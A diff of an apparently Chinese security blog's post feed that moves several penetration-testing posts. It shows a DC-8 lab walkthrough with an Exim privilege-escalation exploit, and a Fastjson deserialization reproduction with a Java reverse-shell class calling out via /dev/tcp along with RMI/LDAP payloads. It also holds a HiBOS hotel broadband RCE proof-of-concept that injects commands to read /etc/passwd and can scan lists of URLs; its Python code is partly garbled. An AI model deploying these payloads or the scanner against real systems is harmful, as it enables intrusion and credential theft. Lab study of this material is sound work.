-<p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
-<br>
-
-<p><code>admin</code> 使用john没跑出来</p>
-<p><code>john</code> 密码为<code>turtle</code></p>
-<p><code>http://192.168.18.141/user/</code>登录成功</p>
-<p>打开content看看</p>
-<p><img src="/posts/437699f/content.png"></p>
-<br>
-
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
-<p>修改成php格式</p>
-<p><img src="/posts/437699f/ncshell.png"></p>
-<p><img src="/posts/437699f/submit.png"></p>
-<p>反弹交互shell</p>
-<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p><img src="/posts/437699f/python_shell.png"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
-<p><img src="/posts/437699f/find.png"></p>
-<p>试着利用下exim4</p>
-<p>查看exim4版本</p>
-<p><code>exim4 --version</code></p>
-<blockquote>
-<p>Exim version 4.89 </p>
-</blockquote>
-<p><code>searchsploit  exim 4</code></p>
-<p>找下exp，选择46996.sh,拷贝到本地，并开启kali的http服务</p>
-<blockquote>
-<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
-<p>python2 -m SimpleHTTPServer</p>
-</blockquote>
-<p>在靶机上下载kali的shell,先回到/tmp 目录下</p>
-<blockquote>
-<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
-</blockquote>
-<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
-<blockquote>
-<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
-</blockquote>
-<p>看下提示用法</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 &#x2F;tmp&#x2F;pwned</span><br><span class="line"># # id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/437699f/flag.png"></p>
-<br>
-
-<br>
-
-<blockquote>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
-<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>DCchallenges</category>
-      </categories>
-      <tags>
-        <tag>DCchallenges</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>E:dpkg被中断，您必须手工运行sudodpkg</title>
     <url>/posts/14f5ef78/</url>
     <content><![CDATA[<p>解决方法</p>
@@ -1526,73 +1526,6 @@ $R=$Z('',$X);$R();
       </categories>
       <tags>
         <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Fastjson反序列化复现</title>
-    <url>/posts/37afa0e0/</url>
-    <content><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>fastjson 是一款阿里的开源java库，用来实现java 对象与json字符串之间的相互转化</p>
-<p>反序列化常用的两种利用方式，一种是基于rmi(Java远程方法调用)，一种是基于ldap。</p>
-<p>@type处可以做反序列化 做反序列化时会调用对象的set方法<br>使用 JdbcRowSetImpl 从远程服务器上加载服务器端的类 从而执行恶意代码</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机 vulhub-fastjson-1.2.24</p>
-<p>ip：192.168.20.128</p>
-<p>kali：192.168.20.129</p>
-<p><code>docker-compose up -d</code> 访问<code>192.168.20.128:8090</code></p>
-<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><h5 id="DNSLog回显"><a href="#DNSLog回显" class="headerlink" title="DNSLog回显"></a>DNSLog回显</h5><p>构造POST请求包，fastjson可以解析payload中val的值，如果dnslog有回显即为fastjson</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:0</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h4 id="RMI方式"><a href="#RMI方式" class="headerlink" title="RMI方式"></a>RMI方式</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ol>
-<li>靶机为vulhub8090端口</li>
-<li>kali上利用python开启web服务，并把编译后的exp放到里面</li>
-<li>kali 8001端口开启 rmi 服务（rmi 远程方法调用  A主机去调用B主机上的exp.class方法）</li>
-<li>kali 8888端口监听反弹的shell</li>
-</ol>
-<h5 id="使用kali搭建一个临时web服务"><a href="#使用kali搭建一个临时web服务" class="headerlink" title="使用kali搭建一个临时web服务"></a>使用kali搭建一个临时web服务</h5><p><code>python3 -m http.server 9999</code></p>
-<h5 id="编译生产exp-放在web目录下"><a href="#编译生产exp-放在web目录下" class="headerlink" title="编译生产exp,放在web目录下"></a>编译生产exp,放在web目录下</h5><p>Exploit.java</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.20.129/8888 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>进行编译<code>javac Exploit.java</code>生成Exploit.class</p>
-<p>把编译好的Exploit.class放在kali上</p>
-<h5 id="kali监听8888端口"><a href="#kali监听8888端口" class="headerlink" title="kali监听8888端口"></a>kali监听8888端口</h5><p><code>nc -lvvp 8888</code></p>
-<h5 id="启动RMI服务"><a href="#启动RMI服务" class="headerlink" title="启动RMI服务"></a>启动RMI服务</h5><p>使用marshalsec项目，启动RMI服务，监听8001端口并加载远程类Exploit.class(marshalsec和编译后的Exploit.class放在同一目录下)</p>
-<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8001</code></p>
-<blockquote>
-<p>kali@kali2020:~/Common/fastjson$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://192.168.20.129:9999/#Exploit&quot;">http://192.168.20.129:9999/#Exploit&quot;</a> 8001<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
-<ul>
-<li>Opening JRMP listener on 8001<br>Have connection from /192.168.20.128:49126<br>Reading message…<br>Is RMI.lookup call for Exploit 2<br>Sending remote classloading stub targeting <a href="http://192.168.20.129:9999/Exploit.class">http://192.168.20.129:9999/Exploit.class</a><br>WARNING: An illegal reflective access operation has occurred<br>WARNING: Illegal reflective access by marshalsec.util.Reflections (file:/home/kali/Common/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar) to field com.sun.jndi.rmi.registry.ReferenceWrapper.wrappee<br>WARNING: Please consider reporting this to the maintainers of marshalsec.util.Reflections<br>WARNING: Use –illegal-access=warn to enable warnings of further illegal reflective access operations<br>WARNING: All illegal access operations will be denied in a future release<br>Closing connection</li>
-</ul>
-</blockquote>
-<p>原因貌似是因为java版本过高，这里默认使用的我昨天刚安装的javac11,换一个低版本的javac去进行编译,但是还是无法反弹shell.</p>
-<p>查了半个下午，最终发现是因为kali 的java版本问题，kali原java版本为java11,然后安装了java8 再去开启rmi服务就正常了</p>
-<p><img src="/posts/37afa0e0/rmi1.png"></p>
-<p>成功反弹shell</p>
-<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>1.2.24 </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>1.2.47</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="LDAP方式"><a href="#LDAP方式" class="headerlink" title="LDAP方式"></a>LDAP方式</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8002</code></p>
-<p><img src="/posts/37afa0e0/ldap1.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.20.129:8002&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a href="https://www.cnblogs.com/chen-w/p/14735881.html">https://www.cnblogs.com/chen-w/p/14735881.html</a></p>
-<p><a href="https://blog.csdn.net/weixin_45556536/article/details/109486621">https://blog.csdn.net/weixin_45556536/article/details/109486621</a></p>
-<p><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
-<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
-<p><a href="https://www.yuque.com/naraku/blog/leak-fastjson">https://www.yuque.com/naraku/blog/leak-fastjson</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -1708,6 +1641,73 @@ $R=$Z('',$X);$R();
       </categories>
       <tags>
         <tag>ssti</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Fastjson反序列化复现</title>
+    <url>/posts/37afa0e0/</url>
+    <content><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>fastjson 是一款阿里的开源java库，用来实现java 对象与json字符串之间的相互转化</p>
+<p>反序列化常用的两种利用方式，一种是基于rmi(Java远程方法调用)，一种是基于ldap。</p>
+<p>@type处可以做反序列化 做反序列化时会调用对象的set方法<br>使用 JdbcRowSetImpl 从远程服务器上加载服务器端的类 从而执行恶意代码</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机 vulhub-fastjson-1.2.24</p>
+<p>ip：192.168.20.128</p>
+<p>kali：192.168.20.129</p>
+<p><code>docker-compose up -d</code> 访问<code>192.168.20.128:8090</code></p>
+<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><h5 id="DNSLog回显"><a href="#DNSLog回显" class="headerlink" title="DNSLog回显"></a>DNSLog回显</h5><p>构造POST请求包，fastjson可以解析payload中val的值，如果dnslog有回显即为fastjson</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:0</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="RMI方式"><a href="#RMI方式" class="headerlink" title="RMI方式"></a>RMI方式</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ol>
+<li>靶机为vulhub8090端口</li>
+<li>kali上利用python开启web服务，并把编译后的exp放到里面</li>
+<li>kali 8001端口开启 rmi 服务（rmi 远程方法调用  A主机去调用B主机上的exp.class方法）</li>
+<li>kali 8888端口监听反弹的shell</li>
+</ol>
+<h5 id="使用kali搭建一个临时web服务"><a href="#使用kali搭建一个临时web服务" class="headerlink" title="使用kali搭建一个临时web服务"></a>使用kali搭建一个临时web服务</h5><p><code>python3 -m http.server 9999</code></p>
+<h5 id="编译生产exp-放在web目录下"><a href="#编译生产exp-放在web目录下" class="headerlink" title="编译生产exp,放在web目录下"></a>编译生产exp,放在web目录下</h5><p>Exploit.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.20.129/8888 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行编译<code>javac Exploit.java</code>生成Exploit.class</p>
+<p>把编译好的Exploit.class放在kali上</p>
+<h5 id="kali监听8888端口"><a href="#kali监听8888端口" class="headerlink" title="kali监听8888端口"></a>kali监听8888端口</h5><p><code>nc -lvvp 8888</code></p>
+<h5 id="启动RMI服务"><a href="#启动RMI服务" class="headerlink" title="启动RMI服务"></a>启动RMI服务</h5><p>使用marshalsec项目，启动RMI服务，监听8001端口并加载远程类Exploit.class(marshalsec和编译后的Exploit.class放在同一目录下)</p>
+<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8001</code></p>
+<blockquote>
+<p>kali@kali2020:~/Common/fastjson$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://192.168.20.129:9999/#Exploit&quot;">http://192.168.20.129:9999/#Exploit&quot;</a> 8001<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
+<ul>
+<li>Opening JRMP listener on 8001<br>Have connection from /192.168.20.128:49126<br>Reading message…<br>Is RMI.lookup call for Exploit 2<br>Sending remote classloading stub targeting <a href="http://192.168.20.129:9999/Exploit.class">http://192.168.20.129:9999/Exploit.class</a><br>WARNING: An illegal reflective access operation has occurred<br>WARNING: Illegal reflective access by marshalsec.util.Reflections (file:/home/kali/Common/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar) to field com.sun.jndi.rmi.registry.ReferenceWrapper.wrappee<br>WARNING: Please consider reporting this to the maintainers of marshalsec.util.Reflections<br>WARNING: Use –illegal-access=warn to enable warnings of further illegal reflective access operations<br>WARNING: All illegal access operations will be denied in a future release<br>Closing connection</li>
+</ul>
+</blockquote>
+<p>原因貌似是因为java版本过高，这里默认使用的我昨天刚安装的javac11,换一个低版本的javac去进行编译,但是还是无法反弹shell.</p>
+<p>查了半个下午，最终发现是因为kali 的java版本问题，kali原java版本为java11,然后安装了java8 再去开启rmi服务就正常了</p>
+<p><img src="/posts/37afa0e0/rmi1.png"></p>
+<p>成功反弹shell</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>1.2.24 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1.2.47</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="LDAP方式"><a href="#LDAP方式" class="headerlink" title="LDAP方式"></a>LDAP方式</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8002</code></p>
+<p><img src="/posts/37afa0e0/ldap1.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.20.129:8002&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
+<p><a href="https://www.cnblogs.com/chen-w/p/14735881.html">https://www.cnblogs.com/chen-w/p/14735881.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_45556536/article/details/109486621">https://blog.csdn.net/weixin_45556536/article/details/109486621</a></p>
+<p><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
+<p><a href="https://www.yuque.com/naraku/blog/leak-fastjson">https://www.yuque.com/naraku/blog/leak-fastjson</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -1849,23 +1849,6 @@ $R=$Z('',$X);$R();
       </tags>
   </entry>
   <entry>
-    <title>HiBOS酒店宽带运营系统RCE漏洞POC</title>
-    <url>/posts/c20f4593/</url>
-    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload </span><br><span class="line">url + &#x2F;manager&#x2F;radius&#x2F;server_ping.php?ip&#x3D;127.0.0.1|cat &#x2F;etc&#x2F;passwd &gt;..&#x2F;..&#x2F;aaa.txt&amp;id&#x3D;1</span><br><span class="line">访问 url + &#x2F;aaa.txt</span><br><span class="line"></span><br><span class="line">如果存在 root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">说明漏洞存在</span><br></pre></td></tr></table></figure>
-
-<p>v0.1单线程版 后续完善 用法<br><code>python3 poc.py -u url</code><br><code>python3 poc.py -f url.txt</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*  HiBOS酒店宽带运营系统RCE漏洞POCv0.1  *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[*]url形式不符合！ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">%<span class="number">20</span>&gt;../../aaa.txt&amp;<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    req = requests.get(url=url1, headers=header, verify=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    url2 = url + &#x27;</span>/aaa.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    req2 = requests.get(url=url2, headers=header, verify=False)</span></span><br><span class="line"><span class="string">    if &#x27;</span>root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash<span class="string">&#x27; in req2.text:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;--------------存在漏洞[*]&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;-------------不存在漏洞[*]&quot;)</span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    parser = OptionParser()</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, default = &#x27;</span><span class="string">&#x27; , type=str, help=&#x27;</span>输入url<span 